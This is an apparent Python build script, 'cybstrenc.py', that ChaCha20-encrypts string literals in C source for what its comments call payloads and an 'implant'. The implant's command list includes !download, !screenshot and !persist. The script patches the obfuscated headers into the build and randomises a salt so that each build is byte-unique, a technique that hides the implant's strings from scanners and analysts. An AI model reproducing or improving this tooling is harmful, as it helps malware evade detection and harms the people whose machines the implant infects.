    # C \x escapes are greedy: a hex escape followed by a hex digit merges.
    return re.sub(r'\\x([0-9a-f]{2})(?=[0-9a-f])', r'\\x\1""', text)


def make_harness(blobs):
    return HARNESS_TMPL % {
        'blobs': '\n'.join('    %s,' % s for s, _c, _p in blobs),
        'lens': '\n'.join('    %d,' % len(c) for _s, c, _p in blobs),
        'wants': '\n'.join('    "%s",' % c_escape(p) for _s, _c, p in blobs),
        'maxlen': max((len(c) for _s, c, _p in blobs), default=0),
    }


# --------------------------------------------------------------------------
# driver
# --------------------------------------------------------------------------

INCLUDE_RE = re.compile(r'^[ \t]*#\s*include\b')


def insert_include(text, builders=()):
    """Add the cybstr.h include, plus any generated builders, after the last
    #include line that appears before the first rewritten literal.

    Blobs live in cybstr.h (one guarded copy for the whole build). Builders
    stay per-file: each carries its own preprocessor conditionals, which are
    only meaningful in the translation unit they came from, and two payloads
    have different help text.

    The anchor is "last include *before first use*", not "last include in the
    file". cybcrypt.h includes <windows.h> and <errno.h> down inside function
    bodies, so anchoring to the final include put cybstr.h at line 618 while
    the first CYBS_AT call was at 583 -- and the build failed with CYBS_AT
    undeclared. Anchoring to the last include that precedes the first use keeps
    the payloads behaving exactly as before (all their includes are at the top)
    while putting cybstr.h early enough for a header that interleaves.
    """
    lines = text.split('\n')
    first_use = text.find('CYBS_AT')
    limit = len(lines) if first_use < 0 else text[:first_use].count('\n')

    # Only an include at the file's *baseline* conditional depth is a valid
    # anchor. cybcrypt.h includes <windows.h> inside its _WIN32 branch;
    # anchoring there made the Linux build fail with CYBS_AT undeclared,
    # because that whole branch is preprocessed away. "Baseline" rather than
    # zero, because every one of these headers sits inside its own include
    # guard and is therefore never literally at depth 0.
    depths, depth = [], 0
    for ln in lines:
        if re.match(r'^\s*#\s*(if|ifdef|ifndef)\b', ln):
            depth += 1
        elif re.match(r'^\s*#\s*endif\b', ln):
            depth -= 1
        depths.append(depth)
    base = next((depths[i] for i, ln in enumerate(lines)
                 if INCLUDE_RE.match(ln)), None)
    if base is None:
        raise ValueError('no #include line to anchor the cybstr.h include to')
    last = -1
    for i, ln in enumerate(lines):
        if i > limit:
            break
        if depths[i] == base and INCLUDE_RE.match(ln):
            last = i
    if last < 0:
        raise ValueError('no top-level #include before the first rewritten '
                         'literal to anchor the cybstr.h include to')
    add = []
    if not re.search(r'^[ \t]*#\s*include\s+"cybstr\.h"', text, re.M):
        add += ['#include "cybstr.h"', '']

    # Builders carry their own `#if` guards so that a -DCYB_MINIMAL build still
    # compiles (see _builder). Those guards only mean anything if the macro is
    # already defined where the function body is compiled. Anchoring the block
    # to the last #include put it above the `#define CYB_F_*` block, so every
    # guard saw an undefined identifier, evaluated to 0, and the guarded
    # fragments were silently dropped from the concatenated string -- the
    # implant's !help lost !download/!ps/!sysinfo/!screenshot/!persist while
    # the verbs themselves (anchored later, after the #defines) still worked.
    # Anchor after the #define of every guard a builder references instead.
    guards = set()
    for _b, _f, _s, _w, body in builders:
        guards.update(re.findall(r'^[ \t]*#\s*if\s+([A-Za-z_]\w*)[ \t]*$',
                                body, re.M))
    anchor = last + 1
    if guards:
        # The CYB_F_* macros are defined inside `#ifdef CYB_MINIMAL / #else /
        # #endif`, so they sit one level below the file's baseline depth and
        # only the closing #endif guarantees the macro exists either way.
        # Anchor after that, not after the #define itself.
        defined_at = {}
        for i, ln in enumerate(lines):
            m = re.match(r'^[ \t]*#\s*define\s+([A-Za-z_]\w*)\b', ln)
            if m and m.group(1) in guards:
                defined_at[m.group(1)] = i
        missing = guards - set(defined_at)
        if missing:
            # Never emit a build that would quietly drop literals.
            raise ValueError(
                'cannot place the generated concatenation: guard(s) %s are '
                'never #defined, so the literals behind them would be '
                'compiled out of the string'
                % ', '.join(sorted(missing)))
        dmax = max(defined_at.values())
        close = next((i for i in range(dmax + 1, len(lines))
                      if depths[i] <= base), None)
        if close is None:
            raise ValueError('cannot place the generated concatenation: no '
                             'closing #endif after the guard #defines')
        anchor = max(anchor, close + 1)
        # Still has to precede every call site.
        for _b, fun, _s, _w, _bd in builders:
            call = re.search(r'\b%s\s*\(\s*\)' % re.escape(fun), text)
            if call and text[:call.start()].count('\n') < anchor:
                raise ValueError(
                    'generated concatenation %s() is called at line %d but '
                    'its guards are not defined until line %d'
                    % (fun, text[:call.start()].count('\n') + 1, anchor))

    for _buf, _fun, _size, _widest, body in builders:
        add += ['/* --- generated literal concatenation, cybstrenc.py --- */',
                body, '']
    lines[anchor:anchor] = add
    return '\n'.join(lines)


def transform_file(path, key32, nonce, outdir, counter):
    with open(path, 'r', encoding='utf-8', errors='surrogateescape') as f:
        src = f.read()
    base = os.path.basename(path)
    ob = Obfuscator(key32, nonce, base, counter)
    text = ob.run(src)

    # `sizeof(LABEL) - 1` is only valid for a real literal; the replacement is a
    # call, so rewrite it, then refuse to emit if any survived.
    for macro in ob.defines:
        text = re.sub(r'sizeof\s*\(\s*%s\s*\)\s*-\s*1' % re.escape(macro),
                      'strlen(%s)' % macro, text)
        if re.search(r'sizeof\s*\(\s*%s\s*\)' % re.escape(macro), text):
            raise ValueError('%s: sizeof(%s) cannot survive obfuscation -- '
                             'use strlen(%s)' % (base, macro, macro))

    out_path = os.path.join(outdir, base)
    with open(out_path, 'w', encoding='utf-8', errors='surrogateescape') as f:
        f.write(insert_include(text, ob.builders))
    return ob, out_path


def crosscheck(key32, salt):
    """Third opinion on the cipher, if `cryptography` happens to be installed.

    The two constructions differ: this file and cybcrypt.h use the DJB layout
    (st[12] = 32-bit counter, st[13..15] = 96-bit nonce), `cryptography`
    exposes the IETF layout (st[12..13] = 64-bit counter, st[14..15] = nonce).
    They differ only in how the counter is spelled: this file and cybcrypt.h
    put a 32-bit counter in st[12] with a 96-bit nonce in st[13..15], and
    cryptography's 16-byte "nonce" is exactly an LE counter32 followed by that
    nonce96.  So the whole block function is checked, not a corner of it.
    """
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
    except Exception:
        return 'not available (fine: it is not a dependency)'
    try:
        # cryptography takes a 16-byte "nonce" that is a little-endian 32-bit
        # counter followed by a 96-bit nonce, which is this file's layout. So
        # counter 0 plus this build's salt must produce identical keystream.
        ietf = bytes(4) + salt + bytes(8)      # ctr32 = 0, nonce96 = salt || 0
        enc = Cipher(algorithms.ChaCha20(key32, ietf), mode=None).encryptor()
        ref = enc.update(b'cyberdemon') + enc.finalize()
        ours = chacha20(key32, salt + bytes(8), b'cyberdemon', 0)
        return 'agrees with cryptography' if ref == ours else 'MISMATCH'
    except Exception as e:
        return 'error: %s' % e


def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument('--key', default='cyberdemon',
                    help='decryption passphrase (default: cyberdemon)')
    ap.add_argument('-i', '--input', action='append', required=True,
                    help='source file to obfuscate (repeatable)')
    ap.add_argument('-o', '--outdir', required=True,
                    help='directory for the obfuscated copies')
    ap.add_argument('--salt', default=None,
                    help='8 hex chars of build salt (default: random, which '
                         'makes every build byte-unique)')
    ap.add_argument('--manifest', default=None,
                    help='write a JSON manifest of the literals (plaintext included)')
    ap.add_argument('--no-harness', action='store_true',
                    help='skip the generated verification harness')
    ap.add_argument('--quiet', action='store_true')
    a = ap.parse_args(argv)

    if a.salt:
        try:
            raw = bytes.fromhex(a.salt)
        except ValueError:
            print('[!] --salt must be hex', file=sys.stderr)
            return 2
        if len(raw) > 4:
            print('[!] --salt must be at most 4 bytes', file=sys.stderr)
            return 2
        salt = raw.ljust(4, b'\0')
    else:
        salt = os.urandom(4)

    pw = a.key.encode()
    if not pw or len(pw) > 64:
        print('[!] passphrase must be 1-64 bytes', file=sys.stderr)
        return 2
    key32 = hashlib.sha256(pw).digest()
    nonce = salt + bytes(8)

    os.makedirs(a.outdir, exist_ok=True)
    counter = [0]
    blobs, errors = [], []

    for path in a.input:
        if not os.path.isfile(path):
            errors.append('%s: no such file' % path)
            continue
        try:
            ob, out_path = transform_file(path, key32, nonce, a.outdir, counter)
        except ValueError as e:
            errors.append(str(e))
            continue
        blobs.extend(ob.blobs)
        if not a.quiet:
            print('[strenc] %-14s -> %-34s %4d literals'
                  % (path, out_path, len(ob.blobs)))

    if errors:
        for e in errors:
            print('[!] %s' % e, file=sys.stderr)
        return 1

    syms = [s for s, _c, _p in blobs]
    if len(set(syms)) != len(syms):
        print('[!] duplicate blob symbol: two inputs share a basename',
              file=sys.stderr)
        return 1

    longest = max((len(p) for _s, _c, p in blobs), default=0)
    hdr_path = os.path.join(a.outdir, 'cybstr.h')
    with open(hdr_path, 'w') as f:
        f.write(make_header(pw, nonce, blobs))
    if not a.quiet:
        print('[strenc] cybstr.h (salt %s, %d literals, longest %d, %d bytes of pool)'
              % (salt.hex(), len(blobs), longest, sum(len(p) for _s, _c, p in blobs) + len(blobs)))

    if not a.no_harness:
        with open(os.path.join(a.outdir, 'cybstr_verify.c'), 'w') as f:
            f.write(make_harness(blobs))
        if not a.quiet:
            print('[strenc] cybstr_verify.c  (test only -- never link)')

    if a.manifest:
        with open(a.manifest, 'w') as f:
            json.dump({'key': a.key, 'salt': salt.hex(), 'literals': [
                {'symbol': s, 'index': i, 'plain': p.decode('utf-8', 'replace'),
                 'cipher_len': len(c)}
                for i, (s, c, p) in enumerate(blobs)]}, f, indent=1)

    xc = crosscheck(key32, salt)
    if xc == 'MISMATCH':
        print('[!] python cipher disagrees with `cryptography`', file=sys.stderr)
        return 1
    print('[strenc] %d literals encrypted, key=%r, cipher cross-check: %s'
          % (len(blobs), a.key, xc))
    return 0


if __name__ == '__main__':
    sys.exit(main())
